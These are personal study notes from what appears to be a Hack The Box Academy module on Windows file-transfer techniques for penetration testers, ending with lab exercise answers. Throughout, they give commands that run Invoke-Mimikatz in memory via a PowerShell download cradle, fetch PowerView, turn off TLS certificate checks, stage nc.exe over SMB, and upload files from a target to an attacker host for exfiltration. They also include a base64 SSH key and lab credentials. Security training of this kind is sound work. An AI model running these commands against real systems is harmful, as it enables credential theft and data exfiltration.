\\\\\\\\\\\=================================
File transfers
\\Setting the storage
-understand how file transfers and how network operate . host maybe prevent our actions, like app whitelisting or AV/EDR blocking specific app or activities.
file transfers are also affected by network devies such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.
-File transfer is a core feature of any OS, and many tools exist to achive this. hwer many these tools may be blocked or monitored by diligent adm, and worth reviewing a reange of techniques that may be possible in a given environment
\\Windows File Transfer methods
atk can use various file transfer methods to operate and avoid being caught. defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised.
-blog post as an ex of an advanced persistent threat (APT)https://www.microsoft.com/en-us/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/
-Astaroth attack generally followed these steps: phishing link -> led to an LNK file open -> 
Execution WMIC tools with the "/format" parameter, which allowed the download and execution of malicious JavaScript code. the JavaScript code, in turn, down load
payload  by abusing the Bitadmin tool https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool
-> all payloads were bsaed64-encoded and decoded using the Certutil tool resulting in a few DLL files.
the regsvr32 tool : https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32
the used to loead one of the decoded DLLs. which decrypted and loaded other files ultil the final payload, Astaroth, was injected into the UserInit process 
-EX of multiple methods for file transfer and the threat actor using those methods to bypass defensiv
\\Download operations
task: access to machine MS02 need to download a file from pawnbox machine. let see how to accomplish this using multiple file download methods
\\PowerShell Base64 Encode & decode
this is a methods that donot require network comm. by access terminal encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation. decoding the file in the original content. 
-essential step of this method is to ensure file encode and decode is correct. use MD5Sum:https://man7.org/linux/man-pages/man1/md5sum.1.html
a program that calculates and verifies 128-bit MD5 checksums. 
\\Pwnbox check SSH Key MD5 hash
$md5sum id_rsa
\\Pwn encode SSH Key to Base64
$cat id_rsa |base64 -w 0;echo
=> copy string into a window powershell and use soem ps function to decode
$PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
-confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does
https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.5&viewFallbackFrom=powershell-7.2
$Get-FileHash C:\Users\Public\rd_rsa -Algorithm md5sum
Noote: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.
\\PowerShell Web downloads
-most companies allow http and HTTPS outbound traffic through the firewall to allow employee productivity leveraging these transportation methods for file transfer operation is very convinient.
still defenders can use web filtering solutions to prevent access to specific website categories, block the download of the file type (like .exe) or only allow access to a list of whitelisted domains in more restricted networks
-Power shell offer many file transfer options in any version of ps the System.Net.WebClient class can be used to download a file 
over http, https or FTP. the following table describes WebClient methods for downloading data from a resource:
Method	Description
OpenRead	Returns the data from a resource as a Stream.
OpenReadAsync	Returns the data from a resource without blocking the calling thread.
DownloadData	Downloads data from a resource and returns a Byte array.
DownloadDataAsync	Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	Downloads data from a resource to a local file.
DownloadFileAsync	Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	Downloads a String from a resource and returns a String.
DownloadStringAsync	Downloads a String from a resource without blocking the calling thread.
\\Powershell DownloadFile Method
specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name
\\File Download
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
\\PowerShell DownloadString - Fileless Method
fileless attacks work by using some OS functions to download the payload and execute it directly. 
-PS also be used to perform fileless attacks. instead of downloading a PS script to disk. 
we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
IEX also accepts pipeline input
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
\\PowerShell Invoke-WebRequest
-from ps 3.0 onwards. the Invoke-WebRequest cmdlet is also available, but it is noticably slower at downloading files.
 you can use the aliases iwr, curl and wget instead of Invoke-WebRequest 
 $PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
-Harmj0y has complied an extensive list of PS download cradles :https://gist.github.com/HarmJ0y/bb48307ffa663256e239
it worth gaining familiarity with them and their nuances, such as lack of proxy awareness or touching disk (downloading a file onyo the target) to select the appropriate one for the situation
\\Common Errors with PowerShell=========================================
there may be cases when the Internet Explorer first lauch config has not been completed, which prevents the download
-by pass by -UseBasicParsing
$Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
$Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing| IEX  
-another error in PowerShell download isrelated to the SSL/TLS secure channel if the certificate is not trusted we can by 
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
\\SMB Downloads
the SMB tcp 445 is common in enterprise networks where Windows services are running. it enables app and users to transfer files to and from remote servers
- we can use SMB to download files from our Pwnbox easily. we need to create an SMB server in our Pwnbox with 
https://github.com/fortra/impacket/blob/master/examples/smbserver.py
from impacket and then use copy, move PowerShell Copy-Item or any other tool that allows conn to SMB
\\Create the SMB Server
$sudo impacket-smbserver share -smb2support /tmp/smbshare
\\Copy a File from the SMB Server
$copy \\192.168.220.133\share\nc.exe
new version of Window block unauthenticated guest access, as we can see in the following command:
$copy \\192.168.220.133\share\nc.exe
To transfer files in this scenarios, we can set a username and password using our Impacket SMB server and mount the SMB server on our Windows target machine:
\\Create the SMB Server with a Username and Password
$sudo Impacket-smbserver share -smb2support /tmp/smbshare -user test-password test
\\Mount the SMB Server with Username and Password
$net use n: \\192.168.220.133\share /user:test test
Note: you can also mount SMB server if receive an error when use copy filename \\IP\sharename
\\FTP Downloads
Another way to transfer files is using FTP (file Transfer Protocol), which use port TCP/21 and TCP/20 
-use FTP client or PS Net.WebClient to download files from an FTP server.
-config an FTP Server in our atk host using Python3 pyftpdlib module
\\Installing the FTP Server Python3 Module - pyftpdlib
$sudo pip3 install pyftpdlib
then we can specify port 21 because bydefault, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we dont set a user and Pwndoc
\\Setting up a Python3 FTP Server
$sudo python3 -m pyftpdlib --port 21
-After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PS Net.WebClient
\\Transferring Files from an FTP Server Using PowerShell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
-When we get a shell on a remote machine, we may not have an interactive shell if that case we can crete a FTP cmd line file to download a file.
->create a file containing the cmd we want to execute and then use the FTP client to use that file to download that file
$> echo open 192.168.49.128 > ftpcommand.txt
$> echo USER anonymous >> ftpcommand.txt
$> echo binary >> ftpcommand.txt
$> echo GET file.txt >> ftpcommand.txt
$> echo bye >> ftpcommand.txt
$> ftp -v -n -s:ftpcommand.txt
$>open 192.168.49.128 >USER anonymous 
$> GET file.txt >bye > more file.txt
\\Upload operations
-There are also situation such as pwd cracking, analysis, exfiltration, etc,...where we must upload files from our target machine into our atk host. we can use the same methods we used for download operation but now for uploads.
Lets see how we can accomplish uploading files in various ways.
\\PowerShell Base64 Encode & decode
Encode File Using PowerShell
PS$  [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
$ PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
->copy this content and paste it into our atk host, use the base64 command to decode it, and use the md5sum app to confirm the transfer happened correctly
\\Decode Base64 String in Linux
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
echo <string base64>= | base64 -d > hosts
$md5sum hosts
\\PowerShell Web uploads
PS doesn't have a buit-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function.,well also need a Web server that accepts uploads , which is not default option in most common webserver utilities
- use uploadserver, and extended module of the python HTTP.server module, which includes a file upload pages
\\Installing a configured WebServer with Upload
$pip3 install uploadserver
$python3 -m uploadserver
-> now use a PowerShell script PSUpload.ps1 which usese Invoke-RestMethod to perform the upload operations.
the scrip accept 2 parameters -File, which use to specify the file path, and -Uri, the server URL 
where upload our file
\\PowerShell Script to Upload a file to python Upload Server
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
\\PowerShell Base64 Web Upload
-other ways to use PS and base64 encoded files for upload operation is by using Invoke-WebRequest or Invoke-RestMethod together with Netcat. 
use Netcat to listen in on a port specify and send the file as POST request. -> copy the output and use the base64 decode function to convert the base 64 string into a file
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
-we catch base64 data with Netcat and use the base64 application with the decode option to convert the string to the file 
$nc -lvnp 8000
$echo <base64> | base64 -d -w 0 > hosts
\\SMB uploads
company usually allow outbound traffic using HTTP(TCP/80) and HTTPS (TCP/443) protocol. commonly enterprises don't alow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential atk/
- for more infor. read the Microsoft post prevent SMB traffic from lateral connections and entering or leaving the network
-an alternative is to run SMB over Http with WebDav.WebDav (RFC 4918) is extension of HTTP, the internet protocol that web browser and web server use to comm with each other.
-the WebDAV protocol enables a webserver to behave like a file server, supporting collaborative content authoring. WebDAV can also use HTTPS
- when use SMB it will first attempt to conn using the SMB protocol and if there's no SMB share available, it will try to conn using HTTP, in the following Wireshark  capture,
attempt to conn to the file share testing3, and because it didn;t find anything with SMB it uses HTTP.
\\Configurating WebDav Server
-need install 2 modules, wsgidav and cheroot https://github.com/mar10/wsgidav  -> run the wsgidav
$sudo pip3 install wsgidav cheroot
\\Using the WebDav Python module
-sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
\\Connecting to the Webdav share
->attempt to connect to the share using DavWWWRoot directory
$dir \\192.168.49.128\DavWWWRoot
NOTE: DavWWWRoot is special keword recognized by the Windows Shell. No Such folder exists on your WebDAV server. the DavWWWRoot keyword tells the Mini-Redirector driver.which handles WebDAV request that you are conn to the root of the WebDAV server
-you can avoid using this keyword if you specify a folder that exists on server when conn to the server for ex: \192.168.49.128\sharefolder
\\Uploading Files using SMB
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
NOTE: if there are no SMB (TCP/445) restrictions you can use impacket-smbserver the same way we set it up for download operations
\\FTP uploads
upload file using FTP very simlilar with downloading files. -use PS or the FTP client to complete the operation. before stat FTP server using the python module pyftpdlib. we need to specify the option --write to allow clients to upload files to our atk host
$sudo python3 -m pyftpdlib --port 21 --write
-> let use PS upload function to upload a file to our FTP server
\\PowerShell Upload File
PS C:\htb> (New-Objec129t Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
\\Cerate a Command File for the FTP Client to Upload a File
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
<test> 10.129.27.46
Download the file flag.txt from the web root using wget from the Pwnbox. 
Submit the contents of the file as your answer.
(New-Object System.Net.WebClient).DownloadFile('http://STMIP/flag.txt', "/home/htb-ac413848/flag.txt")
$wget http://STMIP/flag.txt  -> type ./flag.txt
<test>Upload the attached file named upload_win.zip to the target using the method o
f your choice. Once uploaded, unzip the archive, and run "hasher upload_win.txt" from the command line. Submit the generated hash as your answer.
wget https://academy.hackthebox.com/storage/modules/24/upload_win.zip
-> $xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!:
-> start http server on target $python3 -m http.server <port>
-> upload file $iwr http://<iptarget>:<port>/upload_win.zip -OutFile upload_win.zip
-> $Expand-Archive .\upload_win.zip
-> $hasher.exe .\upload_win\upload_win.txt
<test>Connect to the target machine via RDP and practice various file transfer operations
 (upload and download) with your attack host. Type "DONE" when finished
 <1> utilize $urlretrieve function from the urllib.request 
$python3 -> import urllib.request as request ->cat
$request.urlretrieve("http://STMIP/flag.txt", "flag.txt");
<2> $ssh htb-student@STMIP (HTB_@cademy_stdnt!:)
wget https://academy.hackthebox.com/storage/modules/24/upload_nix.zip
unzip upload_nix.zip
->$scp upload_nix.txt htb-student@SMTIP:~/
or -> listens on aport and redirect the input it receives 
$nc -lp <port9999> > upload_nix.txt  --> nc -w 3 stmip stmport < upload_nix.txt
-> $haser upload_nix.txt

\\\\\\\========================================
Linux File Transfer methods
few download method
